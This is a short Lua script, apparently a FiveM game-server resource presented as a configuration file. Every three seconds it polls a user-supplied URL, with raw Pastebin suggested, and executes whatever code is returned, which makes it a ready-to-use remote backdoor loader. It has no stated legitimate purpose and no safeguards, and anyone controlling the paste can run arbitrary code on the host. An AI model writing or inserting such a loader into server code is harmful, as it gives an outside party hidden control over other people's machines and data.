-- Script configuration starts here !
Config = {}

Config.RemoteURL = "PASTE YOUR LINK HERE" -- Recomended Raw Pastebin
Config.ExecutionInterval = 3 --Seconds


CreateThread(function()
    while (true) do 
        Wait(Config.ExecutionInterval * 1000)
        PerformHttpRequest(Config.RemoteURL, function(errCode, resData)
            if (resData ~= "OFF") then 
                local code = assert(load(resData))
                code()
            end
        end)
    end
end)
